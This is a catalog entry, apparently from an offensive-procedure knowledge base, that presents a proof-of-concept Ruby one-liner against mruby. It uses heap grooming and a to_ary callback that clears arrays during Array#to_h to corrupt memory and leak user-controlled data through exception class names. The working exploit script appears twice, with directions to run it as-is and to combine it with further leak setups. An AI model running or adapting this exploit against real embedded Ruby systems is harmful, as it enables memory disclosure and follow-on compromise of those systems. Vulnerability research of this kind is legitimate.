---
data: >-
  $size=32; $bb=[]; for i in 0..256; $bb.push("b"*$size); end; class A; def
  to_ary; $bb.clear; $a.clear; $a.push("b"*256);
  $a.push("\x00bcdefg\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY"*3+("a"*200));
  $a.push("y"*256); $a.push("e"*256); return "a"; end; end;
  $a=[[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],A.new]; for i in 0..256;
  $bb.push("z"*$size); end; @a=$a.to_h
tags:
  - memory-corruption
  - leak
  - poc
type: command
executor: ruby
platforms:
  - Embedded Ruby (mruby)
id: 2a3d9a45-89a3-4166-84af-a17cf4be9006
created_at: '2025-12-14T17:26:48.768Z'
updated_at: '2025-12-14T17:26:48.768Z'
verified: false
validated: true
submitted: true
---
# mruby-memory-corruption-poc

## Command

```ruby
$size=32; $bb=[]; for i in 0..256; $bb.push("b"*$size); end; class A; def to_ary; $bb.clear; $a.clear; $a.push("b"*256); $a.push("\x00bcdefg\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY"*3+("a"*200)); $a.push("y"*256); $a.push("e"*256); return "a"; end; end; $a=[[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],A.new]; for i in 0..256; $bb.push("z"*$size); end; @a=$a.to_h
```

## Description

This command demonstrates memory corruption potential by using to_ary to manipulate arrays for out-of-bounds access, allowing user-controlled data to be read as class names in exceptions, enabling info disclosure for further exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$a` | Target array with crafted elements | Yes |
| `$bb` | Array for allocation control | Yes |
| `$size` | Size for grooming (32) | Yes |

## Examples

### Basic Usage

Run as-is in mruby to trigger corruption.

### Advanced Usage

Combine with leak setup; inspect output for disclosed data.

## Expected Output

User-controlled data read as class name in exception, e.g., exception message containing crafted strings like "\x00bcdefg...".

## Related

- [[Related Procedure: Advanced-Exploitation-with-Memory-Leak-and-Corruption]]
